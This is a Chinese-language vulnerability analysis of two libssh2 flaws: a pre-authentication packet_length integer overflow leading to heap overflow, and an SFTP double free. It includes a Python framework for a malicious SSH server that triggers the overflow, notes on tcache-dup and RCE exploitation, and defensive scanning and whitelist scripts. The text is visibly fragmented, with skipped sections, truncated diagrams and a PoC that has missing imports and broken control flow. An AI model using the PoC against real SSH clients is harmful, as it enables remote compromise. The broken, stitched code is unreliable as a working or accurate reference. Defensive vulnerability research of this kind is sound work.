1. 引言：客户端安全模型的盲区

在SSH安全领域，传统的研究焦点几乎全部集中在服务器端——防止暴力破解、加固sshd配置、管理密钥。但2026年披露的一系列libssh2漏洞将安全模型翻转了过来：不是客户端攻击服务器，而是恶意服务器攻击客户端。

想象这样一个场景：你的CI/CD流水线每天自动连接数十个远程Git仓库拉取代码；你的备份脚本通过SFTP定期同步文件到远程服务器；你的监控系统通过SSH轮询远程主机状态。这些操作都依赖libssh2库。如果其中一个远程服务器被攻击者控制或伪造，它只需要在握手阶段发送一个精心构造的数据包，就能在你的客户端机器上触发堆溢出，进而实现远程代码执行。更可怕的是，这一切发生在认证之前——不需要任何凭据。

本文将深度分析libssh2的两个关键漏洞：CVE-2026-55200（预认证整数溢出至堆溢出，CVSS 9.2）和CVE-2026-66032（SFTP双重释放，CVSS 8.8），并回顾2019年的CVE-2019-3855至CVE-2019-3863历史漏洞系列，揭示libssh2代码库中反复出现的输入验证缺陷模式。

2. libssh2库与SSH协议基础

2.1 libssh2简介

libssh2是一个用C语言实现的SSH2协议客户端库。它不是SSH服务器守护进程，而是帮助其他软件发起出站SSH连接的库。以下是libssh2被广泛嵌入的场景：

┌─────────────────────────────────────────────────────────────────┐
│                    libssh2 嵌入场景与攻击面                       │
├──────────────────┬──────────────────┬───────────────────────────┤
│     应用程序      │   嵌入方式        │       更新路径             │
├──────────────────┼──────────────────┼───────────────────────────┤
│ curl             │ 动态链接(多数发行版)│ 操作系统包管理器           │
│ Git / libgit2    │ 动态或静态链接    │ 操作系统或应用更新         │
│ PHP ssh2扩展     │ 动态链接          │ PHP/PECL更新              │
│ 备份代理         │ 常为静态链接      │ 需要厂商安全公告           │
│ IoT/网络固件     │ 固件中静态编译    │ 厂商固件发布               │
│ CI/CD工具        │ Vendored或容器化  │ 容器镜像重建               │
│ Paramiko (Python)│ 独立实现(非libssh2)│ 不受影响(但协议层类似)     │
└──────────────────┴──────────────────┴───────────────────────────┘

关键风险点在于静态链接的副本：操作系统包管理器更新了系统级libssh2包，但那些静态编译进备份代理或固件中的libssh2副本不会被更新，它们会继续以漏洞状态运行。

3.2 SSH二进制包协议结构

RFC 4253第6节定义了SSH传输层二进制包格式：

┌──────────────────────────────────────────────────────────────────┐
│                   SSH 二进制包结构 (RFC 4253 §6)                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  偏移    字段              长度    说明                          │
│  ────────────────────────────────────────────────────────────── │
│  0       packet_length    4字节   payload + padding的总长度      │
│                                  (不含自身4字节和MAC)            │
│  4       padding_length   1字节   随机填充的长度                  │
│  5       payload          n1字节  实际消息内容                    │
│                                  n1 = packet_length              │
│                                      - padding_length - 1        │
│  5+n1    random padding   n2字节  随机字节，n2 = padding_length  │
│  5+n1+n2 MAC              m字节   消息认证码 (可选)              │
│                                  m = mac_length                 │
│                                                                  │
│  图示:                                                           │
│  ┌──────────┬────────────┬─────────────┬───────────┬──────────┐ │
│  │  uint32  │    byte    │   byte[n1]  │ byte[n2]  │ byte[m]  │ │
│  │  packet  │  padding   │   payload   │  random   │   MAC    │ │
│  │  length  │  length    │             │  padding  │          │ │
│  └──────────┴────────────┴─────────────┴───────────┴──────────┘ │
│  0          4            5             5+n1        5+n1+n2      │
│                                                                  │
│  packet_length = padding_length(1) + payload(n1) + padding(n2)  │
│  即: n1 + n2 + 1 = packet_length                                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘

packet_length是包头第一个字段，4字节大端无符号整数。客户端读到这个值后，按它分配缓冲区、读取后续数据。正常SSH包这个值在几百到几万字节之间（例如密钥交换的SSH_MSG_KEXINIT包大约500-2000字节），但协议规范没有强制校验这个值的合理上界——实现层必须自己防御。

3.3 根因分析：transport.c中的整数溢出

漏洞位于src/transport.c的ssh2_transport_read()函数中。以下是漏洞代码的简化分析：

// src/transport.c - ssh2_transport_read() 函数
// 以下为漏洞代码的简化版，展示核心问题

static int ssh2_transport_read(LIBSSH2_SESSION *session)
{
    struct transportpacket *p = &session->packet;
    unsigned char block[SSH_BLOCK_SIZE];
    int rc;

    // ... 读取第一个加密块 ...
    rc = session->recv(session->abstract, block, block_size);

    // 从block中解析packet_length (4字节大端无符号整数)
    // ssh2_ntohu32: 网络字节序转主机字节序
    p->packet_length = ssh2_ntohu32(block);  // 攻击者完全可控!

    // 漏洞根因: 只检查下界，没有检查上界!
    if (p->packet_length < 1)
        return LIBSSH2_ERROR_DECRYPT;

    // *** 上界检查缺失 ***
    // 正常应该有: if (p->packet_length > LIBSSH2_PACKET_MAXPAYLOAD) return ERROR;
    // 但这行代码不存在!

    /* total_num 计算后续需要分配的缓冲区大小 */
    // total_num 包含 packet_length 本身 + 额外开销
    // 这里的算术运算使用32位无符号整数
    unsigned int total_num;

    // 漏洞算术: 当 packet_length = 0xffffffff 时发生整数溢出
    // 具体计算路径(简化):
    total_num = 4;  // packet_length字段自身
    total_num += p->packet_length;      // 0xffffffff + 4 = 0x3 (回绕!)
    total_num += mac_len;               // 0x3 + mac_len
    total_num += auth_len;              // 继续累加(仍然很小)

    // 检查total_num是否合理 (但total_num已经回绕为小值，通过检查!)
    if (total_num == 0 || total_num > 35000)
        return LIBSSH2_ERROR_INVAL;
    // total_num ≈ 19，通过检查!

    // 分配缓冲区: 只分配了19字节!
    p->payload = LIBSSH2_ALLOC(session, total_num);
    if (!p->payload)
        return LIBSSH2_ERROR_ALLOC;

    // ... 后续代码按原始 packet_length (0xffffffff) 语义读取数据 ...
    // 往19字节的缓冲区中写入大量数据 -> 堆溢出!

    // 读取payload数据到缓冲区
    // 这里使用的长度仍然基于原始的packet_length
    rc = session->recv(session->abstract, 
                       p->payload + 5,           // 偏移到payload区域
                       p->packet_length - 1);    // 0xffffffff - 1 ≈ 4GB!
    // 堆溢出! 19字节缓冲区被写入海量数据
}

核心问题可以用一行伪代码概括：

// 漏洞本质:
uint32_t packet_length = 0xffffffff;  // 攻击者控制
uint32_t total_num = 4 + packet_length + mac_len + auth_len;
// 4 + 0xffffffff + 0 + 16 = 0x00000013 = 19 (模 2^32 回绕)

malloc(19);  // 只分配19字节
// 但后续按 packet_length = 0xffffffff 的语义写入数据
// => 堆溢出 (Heap Buffer Overflow)

3.4 19字节的魔法：0xffffffff回绕计算

19这个数字不是随意的，它是0xffffffff经过ssh2_transport_read()中算术运算回绕后的精确结果。具体回绕路径取决于libssh2内部total_num的计算公式（含block_size、mac_size、padding等偏移）：

回绕计算详解 (以特定配置为例):

假设配置:
  block_size = 8    (AES-128-CBC的块大小)
  mac_len = 0       (加密建立前无MAC)
  auth_len = 16     (AEAD认证数据长度)

计算过程:
  total_num = 4                          // packet_length字段自身
  total_num += packet_length             // 4 + 0xffffffff = 0x00000003 (回绕!)
  total_num += mac_len                   // 0x3 + 0 = 0x3
  total_num += auth_len                  // 0x3 + 16 = 0x13 = 19

  结果: total_num = 19

验证: 0xffffffff + 4 + 0 + 16
     = 0xffffffff + 20
     = 0x100000013
     截断为32位: 0x00000013 = 19  ✓

分配: malloc(19)  -> 19字节的堆缓冲区
写入: recv(payload, 0xffffffff - 1)  -> 向19字节缓冲区写入约4GB数据
结果: 堆溢出，覆盖相邻堆内存结构

3.5 恶意SSH服务器PoC框架

触发 libssh2 ssh2_transport_read() 中的整数溢出至堆溢出

注意: 此PoC仅为漏洞验证框架，不包含完整的堆布局利用。
完整利用需要: ASLR绕过 + 堆布局控制 + ROP链构造。

参考: github.com/bikini/exploitarium/tree/main/libssh2-cve-2026-55200-poc

import struct
import threading
import hashlib
import os
from typing import Optional

# SSH 协议常量
SSH_BANNER_SERVER = b"SSH-2.0-malicious_server_1.0\r\n"
SSH_MSG_KEXINIT = 20
SSH_MSG_NEWKEYS = 21

# 恶意 packet_length 值 - 触发整数溢出
MALICIOUS_PACKET_LENGTH = 0xFFFFFFFF  # 4294967295, 回绕为约19字节


class MaliciousSSHServer:
    """恶意SSH服务器，触发CVE-2026-55200整数溢出"""

    def __init__(self, host: str = "0.0.0.0", port: int = 2222):
        self.host = host
        self.port = port
        self.server_socket: Optional[socket.socket] = None
        self.running = False

    def start(self):
        """启动恶意SSH服务器"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True

        print(f"[*] 恶意SSH服务器监听在 {self.host}:{self.port}")
        print(f"[*] 等待客户端连接...")

        while self.running:
            try:
                client_sock, addr = self.server_socket.accept()
                print(f"[+] 客户端连接来自: {addr}")

                # 为每个客户端创建线程
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_sock, addr),
                    daemon=True
                )
                client_thread.start()
            except OSError:
                break

    def handle_client(self, client_sock: socket.socket, addr: tuple):
        """处理客户端连接 - 执行恶意握手"""

            self.receive_client_kexinit(client_sock)

            # 阶段3: 发送服务器的 KEXINIT (正常)
            self.send_server_kexinit(client_sock)

            # 阶段4: 密钥交换 (简化: 跳过真实DH交换)

            # 以建立加密通道，然后在加密层注入恶意包
            self.simulate_key_exchange(client_sock)

            # 注意: 在加密建立后，恶意包需要加密
            # 此处展示明文阶段的触发方式
            self.send_malicious_packet(client_sock)

            print(f"[+] 恶意数据包已发送给 {addr}")
            print(f"[*] 如果客户端使用受影响的libssh2版本，")
            print(f"    ssh2_transport_read() 将发生整数溢出")
            print(f"    packet_length=0xFFFFFFFF -> 回绕为19字节分配")

        # 接收客户端banner

        while b"\r\n" not in client_banner:
            client_banner += client_sock.recv(256)

        print(f"[*] 服务器banner已发送")

    def receive_client_kexinit(self, client_sock: socket.socket):

        length_data = client_sock.recv(4)
        packet_length = struct.unpack(">I", length_data)[0]

        # 读取剩余数据
        packet_data = client_sock.recv(packet_length)
        print(f"[+] 收到客户端KEXINIT (长度: {packet_length})")

        # 构造KEXINIT payload
        cookie = os.urandom(16)

4.2 根因分析：sftp_open()中的双重释放

CVE-2026-66032发生在SFTP协议层，需要客户端已通过SSH认证并打开SFTP会话。漏洞的触发条件是恶意SSH服务器对SSH_FXP_OPEN请求返回一个特殊的响应序列。

// src/sftp.c - sftp_open() 函数中的双重释放 (简化分析)

LIBSSH2_SFTP_HANDLE *sftp_open(LIBSSH2_SFTP *sftp, 
                                const char *filename, 
                                unsigned long flags, 
                                long mode)
{
    // ... 构造SSH_FXP_OPEN请求并发送 ...

    // 等待服务器响应
    // 服务器响应SSH_FXP_STATUS包含FX_OK表示成功
    // 但随后sftp_packet_require()可能返回错误

    // 漏洞代码路径:

    // 步骤1: 读取SSH_FXP_OPEN的响应
    unsigned char *data;
    size_t data_len;
    int rc = sftp_packet_require(sftp, SSH_FXP_STATUS, 
                                  &data, &data_len);

    if (rc == 0) {
        // 服务器返回了SSH_FXP_STATUS
        int status = ssh2_ntohu32(data + 5);  // 解析状态码

        if (status == LIBSSH2_FX_OK) {
            // 服务器表示打开成功
            // 漏洞: 在这里释放了data缓冲区
            LIBSSH2_FREE(session, data);  // 第一次释放!
            data = NULL;

            // 但继续等待后续数据包...
            // 如果后续的sftp_packet_require()返回特定错误
            // (如LIBSSH2_ERROR_CHANNEL_PACKET_EXCEEDED)

            rc = sftp_packet_require(sftp, SSH_FXP_HANDLE,
                                      &data, &data_len);

            if (rc < 0) {
                // 错误处理路径
                // 漏洞: data指针可能仍指向已释放的内存
                // (在某些代码路径中，data未被置NULL或检查)

                // 并且存在清理代码再次释放它:
                if (data) {
                    LIBSSH2_FREE(session, data);  // 第二次释放! DOUBLE FREE!
                }

                return NULL;
            }
        }
    }

    // ... 正常处理 ...
}

4.3 tcache dup利用原理

在glibc 2.26+中，tcache（Thread Local Caching）机制为双重释放提供了理想的利用原语：

│  正常状态:                                                       │
│  tcache[0x20] -> NULL  (空链表)                                  │
│                                                                  │

7.3 从堆溢出到RCE的利用链

┌─────────────────────────────────────────────────────────────────┐
│              CVE-2026-55200: 从堆溢出到RCE的利用链               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 触发整数溢出                                                │
│     packet_length = 0xFFFFFFFF → malloc(19)                     │
│                                                                 │
│  2. 堆溢出                                                      │
│     向19字节缓冲区写入攻击者控制的数据                           │
│     覆盖相邻堆结构 (glibc chunk header)                         │
│                                                                 │
│  3. 堆元数据控制                                                │
│     覆盖: chunk size, fd指针, bk指针                            │

│                                                                 │
│  4. 函数指针劫持                                                │

│                                                                 │

8.2 识别静态链接的libssh2副本

#!/bin/bash
# 扫描系统中静态链接libssh2的二进制文件

echo "[*] 扫描静态链接libssh2的二进制文件..."
echo ""

# 方法1: 搜索包含libssh2字符串的二进制文件
echo "[1] 搜索包含libssh2版本字符串的二进制:"
find / -type f -executable 2>/dev/null | while read -r bin; do
    if strings "$bin" 2>/dev/null | grep -q "libssh2"; then
        # 检查是否动态链接libssh2
        if ! ldd "$bin" 2>/dev/null | grep -q "libssh2"; then
            echo "  [STATIC] $bin"
            strings "$bin" 2>/dev/null | grep "libssh2" | head -3
        fi
    fi
done

echo ""
echo "[2] 检查动态链接libssh2的进程:"
for pid in $(ls /proc/*/maps 2>/dev/null | cut -d/ -f3); do
    if grep -q "libssh2" /proc/$pid/maps 2>/dev/null; then
        cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
        libssh2_path=$(grep "libssh2" /proc/$pid/maps 2>/dev/null | head -1 | awk '{print $6}')
        echo "  PID $pid: $cmdline"
        echo "    libssh2: $libssh2_path"
    fi
done

echo ""
echo "[3] 检查容器中的libssh2:"
docker ps --format "{{.ID}} {{.Image}}" 2>/dev/null | while read id image; do
    version=$(docker exec "$id" sh -c 'strings /usr/lib/*/libssh2.so* 2>/dev/null | grep "libssh2_" | head -1' 2>/dev/null)
    if [ -n "$version" ]; then
        echo "  Container $image: $version"
    fi
done

#!/usr/bin/env python3
"""
SSH连接白名单管理器
仅允许连接到预批准的SSH服务器
"""

import hashlib
import json
import subprocess
import sys
from pathlib import Path
from typing import Optional

class SSHWhitelist:
    """SSH服务器白名单管理"""

    def __init__(self, whitelist_file: str = "/etc/ssh/whitelist.json"):
        self.whitelist_file = Path(whitelist_file)
        self.whitelist = self._load_whitelist()

    def _load_whitelist(self) -> dict:
        if self.whitelist_file.exists():
            return json.loads(self.whitelist_file.read_text())
        return {"servers": []}

    def is_allowed(self, host: str, port: int = 22, 
                   key_fingerprint: Optional[str] = None) -> bool:
        """检查SSH连接目标是否在白名单中"""
        for server in self.whitelist.get("servers", []):
            if server["host"] == host and server.get("port", 22) == port:
                if key_fingerprint and "key_fingerprint" in server:
                    return server["key_fingerprint"] == key_fingerprint
                return True
        return False

    def verify_before_connect(self, host: str, port: int = 22) -> bool:
        """在连接前验证目标服务器"""
        if not self.is_allowed(host, port):
            print(f"[BLOCKED] SSH连接到 {host}:{port} 被拒绝 - 不在白名单中")
            print(f"  CVE-2026-55200 防护: 仅允许连接可信服务器")
            return False

        print(f"[ALLOWED] SSH连接到 {host}:{port} 已授权")
        return True

9. 总结

libssh2的漏洞系列揭示了一个在C语言网络协议库中反复出现的系统性问题：对攻击者控制的长度字段缺乏充分的上界验证。

CVE-2026-55200和2019年的CVE-2019-3855本质上是同一个漏洞——ssh2_transport_read()中packet_length缺少上界检查。2019年的修复只覆盖了一个代码路径，另一个路径潜伏7年后再次被发现。这不是偶然，而是代码审计覆盖不足的必然结果。libssh2自2015年以来有18个已公开CVE，其中越界读（CWE-125）和整数溢出（CWE-190）是最频繁出现的弱点类别。

CVE-2026-66032的双重释放则展示了另一种常见模式：错误处理路径中的资源管理缺陷。当正常路径和错误路径对同一资源进行管理时，如果状态追踪不严格，极易出现双重释放。

从防御角度看，最紧迫的措施是从源码安装修复版本，并全面排查静态链接的libssh2副本。由于截至发文时没有正式tagged release，许多下游发行版仍在backport修复中，组织需要主动跟踪和验证。对于CI/CD流水线和自动化系统，实施SSH连接白名单是减少攻击面的有效手段——如果客户端不需要连接到不受信任的SSH服务器，那么预认证漏洞就无法被触发。

长期来看，这类漏洞的根本解决方案是迁移到内存安全语言实现的SSH库（如Rust的russh），或者至少在编译时启用ASAN/UBSAN进行运行时检测。在C代码中，对所有来自网络的长度字段实施严格的上下界检查应该成为代码审计的强制标准。
